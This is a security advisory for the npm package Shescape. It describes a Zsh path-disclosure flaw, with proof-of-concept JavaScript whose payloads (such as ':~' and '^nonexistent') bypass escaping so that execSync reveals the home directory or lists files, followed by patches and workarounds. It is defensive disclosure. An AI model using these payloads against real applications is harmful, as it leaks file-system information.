# [M] Shescape: Path disclosure on Unix with Zsh

## Summary
Severity: Medium
Advisory: GHSA-6v4m-fw66-8r4x
CVE: CVE-2026-73412
CWE: CWE-155, CWE-78
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-24
Source: https://github.com/advisories/GHSA-6v4m-fw66-8r4x
Type: github-advisory

## Affected
- npm: `shescape` — affected >=0 <2.1.14
- npm: `shescape` — affected >=3.0.0 <3.0.1

## Details
### Impact

This impacts users of Shescape on Unix systems that explicitly configure `shell` to Zsh, or `true` when the default shell is Zsh, using the `escape` and `escapeAll`. The Zsh options `EXTENDED_GLOB` and `MAGIC_EQUAL_SUBST` exacerbate the problem.

In certain case, an attacker can leverage home directory expansion and extended glob syntax to obtain lists of files and directories on the system. Depending on what the command does, this may be used to leak more information.

#### Without option / with `MAGIC_EQUAL_SUBST`

```javascript
import * as cp from "node:child_process";
import { Shescape } from "shescape";

// 1. Prerequisites
const options = {
    shell: "zsh",
    // Or
    shell: true, // Only if the default shell is Zsh
};

// 2. Payload
const payload1 = ":~";
// Or
const payload2 = "a=~"; // requires MAGIC_EQUAL_SUBST

// 3. Usage
const shescape = new Shescape(options);
let escapedPayload;

escapedPayload = shescape.escape(payload1);
// Or
escapedPayload = shescape.escapeAll([payload1]);
// And (example)
const result1 = cp.execSync(`V=${escapedPayload}; echo $V`, options);

// Or
escapedPayload = shescape.escape(payload2);
// Or
escapedPayload = shescape.escapeAll([payload2]);
// And (example)
const result2 = cp.execSync(`echo ${escapedPayload}`, options);

// 4. Impact
console.log("", result1.toString().trim(), "\n", result2.toString().trim());
// Outputs ":" followed by the user's home directory on one line and "a="
// followed by the user's home directory (under MAGIC_EQUAL_SUBST) on the next.
```

#### With `EXTENDED_GLOB`

```javascript
import * as cp from "node:child_process";
import { Shescape } from "shescape";

// 1. Prerequisites
const options = {
    shell: "zsh",
    // Or
    shell: true, // Only if the default shell is Zsh
};

// And (example)
// `setopt EXTENDED_GLOB` in ~/.zshenv

// 2. Payload
let payload;

payload = "pa#ckage.json";
// Or
payload = "^package.json~package-lock.json";
// Or
payload = "^nonexistent";

// 3. Usage
const shescape = new Shescape(options);
let escapedPayload;

escapedPayload = shescape.escape(payload);
// Or
escapedPayload = shescape.escapeAll([payload]);

// And (example)
const result = cp.execSync(`echo ${escapedPayload}`, options);

// 4. Impact
console.log(result.toString());
// Outputs files and directories in the current directory
```

### Patches

This bug has been patched in [v2.1.14] and [v3.0.1] which you can upgrade to now.

If you are already using v3 of Shescape, no further changes are required. If you are using v2 of Shescape it is recommended to upgrade as this version reaches end-of-life status on 2026-09-28, follow the [migration guide] to upgrade to v3.

No patches will be released for version of Shescape lower than v2.0.0.

### Workarounds

Alternatively, users of Shescape can 1) refrain from using Zsh, 2) ensure the `EXTENDED_GLOB` option is disabled, 3) remove all instances of `^`, `#`, and `~` from untrusted inputs.

### For more information

- Comment on Pull Request [#2651] for v2 and [#2649] for v3
- Comment on commit [b4b34c3] for v2 and [43d70b5] for v3
- Open an issue at <https://github.com/ericcornelissen/shescape/issues> (New issue > Question)

## References
- https://github.com/ericcornelissen/shescape/security/advisories/GHSA-6v4m-fw66-8r4x
- https://github.com/ericcornelissen/shescape/pull/2649
- https://github.com/ericcornelissen/shescape/pull/2651
- https://github.com/ericcornelissen/shescape/commit/43d70b59d09bbe5c3fd02ef08b3a123e977ed9de
- https://github.com/ericcornelissen/shescape/commit/b4b34c394e7f9da2775bb75381066b9a228c425f
- https://github.com/ericcornelissen/shescape
- https://github.com/ericcornelissen/shescape/blob/dea8893a5877893d8d4923dbf253080e08899e6d/docs/migration.md
- https://github.com/ericcornelissen/shescape/releases/tag/v2.1.14
- https://github.com/ericcornelissen/shescape/releases/tag/v3.0.1
